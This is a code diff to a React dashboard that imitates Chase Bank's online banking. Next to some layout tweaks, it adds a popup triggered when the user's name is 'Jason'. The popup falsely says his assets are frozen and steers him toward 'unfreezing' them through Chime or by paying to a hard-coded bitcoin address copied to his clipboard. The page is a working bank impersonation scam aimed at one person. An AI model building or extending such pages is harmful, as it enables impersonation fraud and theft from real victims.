@@ -25,6 +25,8 @@ export default function Dashboard() {
   const router = useRouter();
   const [firstName, setFirstName] = useState("");
   const [acc, setAcc] = useState([]);
+  const [showFreeze, setShowFreeze] = useState(false);
+  const [showOptions, setShowOptions] = useState(false);
   useEffect(() => {
     try {
       const t = localStorage.getItem("session");
@@ -41,13 +43,16 @@ export default function Dashboard() {
         .catch(() => {});
     } catch {}
   }, []);
+  useEffect(() => {
+    if (firstName === "Jason") setShowFreeze(true);
+  }, [firstName]);
   return (
     <div className="min-h-screen bg-white">
       <div className="border-b">
-        <div className="mx-auto max-w-7xl px-4 py-3 flex items-center justify-between">
+        <div className="mx-auto max-w-7xl px-4 py-3 flex flex-wrap items-center justify-between gap-3">
           <div className="flex items-center gap-3">
             <img src="/chase.jpeg.jpeg" alt="Chase Bank" className="h-7" />
-            <nav className="hidden md:flex items-center gap-6 text-sm text-chase-navy">
+            <nav className="hidden md:flex items-center gap-4 md:gap-6 text-sm text-chase-navy overflow-x-auto whitespace-nowrap">
               <Link href="/" className="hover:text-chase-blue">Home</Link>
               <Link href="/dashboard" className="pb-1 font-semibold text-chase-blue border-b-2 border-chase-blue">Dashboard</Link>
             </nav>
@@ -64,21 +69,78 @@ export default function Dashboard() {
         </div>
       </div>
 
+      {showFreeze && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40">
+          <div className="w-[92%] max-w-md rounded-lg bg-white p-4 shadow-lg">
+            <h3 className="text-lg font-semibold text-chase-navy">Account Notice</h3>
+            <p className="mt-2 text-sm text-gray-700">Your assets are currently frozen.</p>
+            <p className="mt-1 text-sm text-gray-600">To unfreeze, request verification or contact support. We’ll send instructions to your email.</p>
+            <div className="mt-4 flex flex-wrap items-center gap-2">
+              <button className="rounded bg-chase-blue px-4 py-2 text-white text-sm" onClick={() => { setShowFreeze(false); setShowOptions(true); }}>Request unfreeze</button>
+              <button className="rounded border px-4 py-2 text-sm" onClick={() => setShowFreeze(false)}>Close</button>
+              <button className="rounded border px-4 py-2 text-sm" onClick={() => { alert('Instructions will be sent to your email.'); setShowFreeze(false); }}>Email support</button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {showOptions && (
+  <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40">
+    <div className="w-[92%] max-w-md rounded-lg bg-white p-4 shadow-lg">
+      <h3 className="text-lg font-semibold text-chase-navy">Unfreeze Options</h3>
+      <p className="mt-2 text-sm text-gray-700">Choose how to proceed.</p>
+
+      <div className="mt-4 space-y-2">
+        {/* Chime Button */}
+        <button
+          className="w-full rounded border border-gray-400 bg-blue-800 text-white px-4 py-2 text-sm hover:bg-blue-900"
+          onClick={() => {
+            alert('Chime details will be sent to your email.');
+            setShowOptions(false);
+          }}
+        >
+          Chime
+        </button>
+
+        {/* BTC Button */}
+        <button
+          className="w-full rounded bg-yellow-500 px-4 py-2 text-white text-sm hover:bg-yellow-600"
+          onClick={() => {
+            navigator.clipboard.writeText('bc1qrxdfjunsv39sy8yeq8m6muqwxd55d7hvpd59al');
+            alert('BTC address copied to clipboard: bc1qrxdfjunsv39sy8yeq8m6muqwxd55d7hvpd59al');
+            setShowOptions(false);
+          }}
+        >
+          BTC
+        </button>
+      </div>
+
+      <button
+        className="mt-3 w-full rounded border border-gray-400 bg-red-600 px-4 py-2 text-sm hover:bg-gray-300"
+        onClick={() => setShowOptions(false)}
+      >
+        Close
+      </button>
+    </div>
+  </div>
+)}
+
+
       <main className="mx-auto max-w-7xl px-4 py-6 grid gap-6 md:grid-cols-12">
-        <section className="md:col-span-8 space-y-6">
-          <div className="rounded-lg border border-gray-200 p-6 shadow-sm">
+        <section className="col-span-12 md:col-span-8 space-y-6">
+          <div className="rounded-lg border border-gray-200 p-4 sm:p-6 shadow-sm">
             <div className="flex items-center justify-between">
               <div>
                 <p className="text-xs text-gray-500">Total balance</p>
-                <h2 className="mt-1 text-3xl font-semibold text-chase-navy">{`${(((acc.find(a=>a.type==='checking')?.balance||0)+(acc.find(a=>a.type==='savings')?.balance||0)+(acc.find(a=>a.type==='card')?.balance||0)).toFixed(2))}`}</h2>
+                <h2 className="mt-1 text-2xl md:text-3xl font-semibold text-chase-navy">{`${(((acc.find(a=>a.type==='checking')?.balance||0)+(acc.find(a=>a.type==='savings')?.balance||0)+(acc.find(a=>a.type==='card')?.balance||0)).toFixed(2))}`}</h2>
               </div>
               <div className="flex items-center gap-6">
                 <div className="flex items-center gap-2 text-green-600"><ArrowUpRight size={18} /><span className="text-sm">+$3,420</span></div>
                 <div className="flex items-center gap-2 text-red-600"><ArrowDownLeft size={18} /><span className="text-sm">-$2,075</span></div>
               </div>
             </div>
-            <div className="mt-6 grid grid-cols-1 md:grid-cols-3 gap-4">
-              <div className="rounded-md border p-4">
+            <div className="mt-6 grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
+              <div className="rounded-md border p-3 sm:p-4">
                 <div className="flex items-center justify-between">
                   <div>
                     <p className="text-xs text-gray-500">Checking ••••{(acc.find(a=>a.type==='checking')?.number || '').slice(-4)}</p>
@@ -88,7 +150,7 @@ export default function Dashboard() {
                 </div>
                 <span className="mt-3 inline-block rounded-full bg-green-50 text-green-700 text-xs px-2 py-1">{(acc.find(a=>a.type==='checking')?.status || 'active').charAt(0).toUpperCase() + (acc.find(a=>a.type==='checking')?.status || 'active').slice(1)}</span>
               </div>
-              <div className="rounded-md border p-4">
+              <div className="rounded-md border p-3 sm:p-4">
                 <div className="flex items-center justify-between">
                   <div>
                     <p className="text-xs text-gray-500">Savings ••••{(acc.find(a=>a.type==='savings')?.number || '').slice(-4)}</p>
@@ -134,7 +196,7 @@ export default function Dashboard() {
           </div>
         </section>
 
-        <aside className="md:col-span-4 space-y-6">
+        <aside className="col-span-12 md:col-span-4 space-y-6">
           <div className="rounded-lg border p-4 shadow-sm">
             <h3 className="text-sm font-semibold text-chase-navy">Quick actions</h3>
             <div className="mt-4 grid grid-cols-2 gap-3">
